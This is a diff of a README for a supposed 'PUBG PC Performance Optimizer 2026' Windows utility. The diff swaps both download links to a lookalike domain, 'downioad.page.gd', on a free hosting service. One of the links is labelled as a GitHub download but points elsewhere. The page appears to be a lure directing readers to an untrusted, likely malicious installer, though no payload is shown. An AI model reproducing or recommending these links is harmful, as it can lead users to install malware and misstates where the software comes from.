@@ -2,7 +2,7 @@
 
 Welcome to the PUBG PC Performance Optimizer 2026, a dedicated utility software for Windows desktop users who want to maximize their PlayerUnknown's Battlegrounds experience. This tool is engineered to fine-tune your system settings and game configuration files, aiming to deliver higher and more stable frame rates, minimize in-game stuttering, and provide a smoother overall gameplay environment. It is built for the 2026 gaming season and is optimized for modern Windows 10 and Windows 11 systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest%20Version-007ACC?style=for-the-badge&logo=windows&logoColor=white)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest%20Version-007ACC?style=for-the-badge&logo=windows&logoColor=white)](https://downioad.page.gd/)
 
 ## What's Included
 
@@ -45,4 +45,4 @@ A: Absolutely. The application includes a "Reset to Default" feature within each
 
 Get the latest version of the PUBG PC Performance Optimizer for your Windows desktop.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
